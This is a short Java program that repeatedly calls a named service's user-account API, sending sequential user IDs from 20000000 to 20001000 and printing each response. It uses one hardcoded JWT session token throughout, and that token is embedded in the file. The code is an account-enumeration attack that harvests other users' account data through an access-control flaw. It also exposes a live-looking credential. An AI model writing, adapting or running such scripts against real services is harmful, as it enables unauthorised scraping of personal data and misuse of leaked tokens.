package com.icss.fudTest;
import com.mashape.unirest.http.HttpResponse;
import com.mashape.unirest.http.Unirest;
import com.mashape.unirest.http.exceptions.UnirestException;

public class test {
	public static int MIN_ID = 20000000;
	public static int MAX_ID = 20001000;
	public static void main(String[] args) throws UnirestException {
		for(int i = MIN_ID; i <= MAX_ID; i++) {
			HttpResponse<String> response = Unirest.post("https://api.joinfud.com/api/v1/user/account")
			  .header("x-token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJGdWQiLCJzdWIiOiJGdWQiLCJleHAiOjE2NzQwNTI4NTEsImlhdCI6MTY3MTQ2MDg1MSwianRpIjoiV1FQQVpNIiwidXNlcklkIjoyMDAwNTUwMiwidXNlcm5hbWUiOiJnbXNvbmcifQ.VUze5uVwtHj90dddX9tHutU907xUy-B9lUgHGbafduY")
			  .header("Content-Type", "application/json")
			  .body("{\r\n    \"userId\": " + i + "\r\n}")
			  .asString();
			System.out.println(response.getBody());
		}
	}
}
